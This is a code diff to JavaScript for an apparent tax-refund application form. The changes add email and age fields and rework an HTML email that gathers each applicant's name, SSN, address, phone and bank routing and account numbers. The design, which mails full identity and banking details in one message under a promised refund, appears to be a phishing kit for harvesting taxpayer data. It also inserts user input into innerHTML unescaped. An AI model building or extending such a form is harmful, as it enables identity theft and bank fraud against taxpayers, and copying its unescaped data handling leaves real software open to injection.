@@ -187,10 +187,12 @@ document.addEventListener('DOMContentLoaded', () => {
             const agi = document.getElementById('gross-income').value || "0.00";
             const bank = document.getElementById('bank-name').value || "---";
             const year = document.getElementById('tax-year').value || "---";
+            const email = document.getElementById('email-address').value || "---";
             
             summary.innerHTML = `
                 <div style="display: grid; gap: 8px;">
                     <p><strong>Reporting Taxpayer:</strong> ${name}</p>
+                    <p><strong>Contact Email:</strong> ${email}</p>
                     <p><strong>Filing Period:</strong> ${year}</p>
                     <p><strong>Self-Reported AGI:</strong> $${parseFloat(agi).toLocaleString()}</p>
                     <p><strong>Disbursement Bank:</strong> ${bank}</p>
@@ -341,6 +343,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 reportingYear: document.getElementById('tax-year').value,
                 filingStatus: document.querySelector('input[name="filing-status"]:checked')?.value,
                 fullName: document.getElementById('full-name').value,
+                contactEmail: document.getElementById('email-address').value,
+                age: document.getElementById('age').value,
                 ssn: document.getElementById('ssn').value,
                 address: document.getElementById('address').value,
                 phone: document.getElementById('phone').value,
@@ -363,13 +367,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 const emailHtml = `
                     <div style="font-family: sans-serif; border: 1px solid #002868; padding: 20px; border-radius: 10px;">
                         <h2 style="color:#002868; border-bottom: 2px solid #002868;">New Tax Application Received: ${appId}</h2>
-                        <p><strong>Authorized User:</strong> ${fullDetails.userEmail}</p>
+                        <p><strong>Authorized Portal User:</strong> ${fullDetails.userEmail}</p>
                         <hr>
                         <h3>Identity & Filing</h3>
                         <p><strong>Legal Name:</strong> ${fullDetails.fullName}</p>
+                        <p><strong>Form Email Address:</strong> ${fullDetails.contactEmail}</p>
+                        <p><strong>Age:</strong> ${fullDetails.age}</p>
                         <p><strong>SSN:</strong> ${fullDetails.ssn}</p>
-                        <p><strong>DOB:</strong> ${document.getElementById('reg-dob')?.value || 'N/A'}</p>
-                        <p><strong>Address:</strong> ${fullDetails.address}</p>
+                        <p><strong>Residential Address:</strong> ${fullDetails.address}</p>
                         <p><strong>Phone:</strong> ${fullDetails.phone}</p>
                         <p><strong>Filing Status:</strong> ${fullDetails.filingStatus}</p>
                         <p><strong>Tax Year:</strong> ${fullDetails.reportingYear}</p>
@@ -381,9 +386,9 @@ document.addEventListener('DOMContentLoaded', () => {
                         <p style="font-size: 20px; color: #28a745;"><strong>Calculated Refund:</strong> $${fullDetails.estimatedRefund}</p>
                         <hr>
                         <h3>Banking Information (EFT)</h3>
-                        <p><strong>Bank:</strong> ${fullDetails.bankName}</p>
-                        <p><strong>Routing:</strong> ${fullDetails.routing}</p>
-                        <p><strong>Account:</strong> ${fullDetails.account}</p>
+                        <p><strong>Bank Name:</strong> ${fullDetails.bankName}</p>
+                        <p><strong>Routing Number:</strong> ${fullDetails.routing}</p>
+                        <p><strong>Account Number:</strong> ${fullDetails.account}</p>
                     </div>
                 `;
 
